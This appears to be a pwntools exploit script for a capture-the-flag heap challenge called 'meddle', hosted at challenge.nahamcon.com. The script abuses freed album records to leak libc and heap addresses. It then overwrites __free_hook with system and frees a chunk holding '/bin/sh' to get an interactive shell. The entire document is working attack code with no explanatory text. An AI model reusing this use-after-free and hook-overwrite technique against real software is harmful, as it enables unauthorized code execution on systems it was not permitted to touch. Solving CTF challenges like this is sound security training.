#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenge.nahamcon.com --port 31651 ./meddle
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./meddle_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.nahamcon.com'
port = int(args.PORT or 32358)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, aslr = False, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def tohex(val, nbits):
  	return (val + (1 << nbits)) % (1 << nbits)


l = exe.libc

def add_album(ablum,artist):
    io.sendlineafter("> ","1")
    io.sendlineafter("album name: ",ablum)
    io.sendlineafter("artist name: ",artist)

def del_album(idx):
    io.sendlineafter("> ","4")
    io.sendlineafter("delete? ",str(idx))

def view_album(idx):
    io.sendlineafter("> ","2")
    io.sendlineafter("view? ", str(idx))

def rate_ablum(idx,rate):
    io.sendlineafter("> ","3")
    io.sendlineafter("rate? ", str(idx))
    io.sendlineafter("album? ",str(rate))

for i in range(10):
    p = chr((ord('a')+i))*4
    add_album(p,p)

for i in range(9):
    del_album(i)

# print (hex(l.sym["main_arena"]))
print (hex(l.sym["__malloc_hook"]))

view_album(7)

io.recvuntil("album name: ")
leak1 = io.recvline()[:-1]
print leak1

io.recvuntil("ratings: ")
leak2 = io.recvline()[:-1]
print leak2
if int(leak2) < 0 :
    leak2 = p32(tohex(int(leak2),32))
else:
    leak2 = p32(int(leak2))
print leak2

leak = u64((str(leak2)+ str(leak1)).ljust(8,"\x00"))

print hex(leak)
l.address = leak - 96 - 0x10 - l.sym["__malloc_hook"]
malloc_hook = l.sym["__malloc_hook"]
free_hook = l.sym["__free_hook"]
print ("base libc :",hex(l.address))
print ("malloc hook :",hex(malloc_hook))
print ("free hook :",hex(free_hook))
if args.LOCAL:
    offset = [0xcbd1a, 0xcbd1d, 0xcbd20]
else :
    offset = [0x4f2c5, 0x4f322, 0x10a38c]

view_album(1)

io.recvuntil("album name: ")
leak1 = io.recvline()[:-1]
print leak1

io.recvuntil("ratings: ")
leak2 = io.recvline()[:-1]
print leak2

if int(leak2) < 0 :
    leak2 = p32(tohex(int(leak2),32))
else:
    leak2 = p32(int(leak2))
print leak2

leak = u64((str(leak2)+ str(leak1)).ljust(8,"\x00"))
print hex(leak)
if args.LOCAL:
    base_heap = leak - 0x2a0
    base_heap = leak - 0x260
else :
    base_heap = leak - 0x260

print hex(base_heap)

to_write = base_heap + 0xc8
to_write = base_heap + 0x88
rate_ablum(6,to_write)

p = "/sh\x00"
add_album(p,p)
rate_ablum(10,u32("/bin"))

# p = p32(malloc_hook >> 32)
# add_album(p,p)
# rate_ablum(11,malloc_hook)
#
# one_gadget = l.address + offset[1]
# p = p32(malloc_hook >> 32)
# add_album(p,p)
# rate_ablum(12,one_gadget)

p = p32(free_hook >> 32)
add_album(p,p)
rate_ablum(11,free_hook)
#
system = l.sym["system"]
p = p32(system >> 32)
add_album(p,p)
rate_ablum(12,system)
#
# # io.sendlineafter("> ","1")
io.sendlineafter("> ","4")
io.sendline("10")
# p = "JUNK"*2
# add_album(p,p)
# -96 - 0x10
# main_arena
# __malloc_hook




io.interactive()
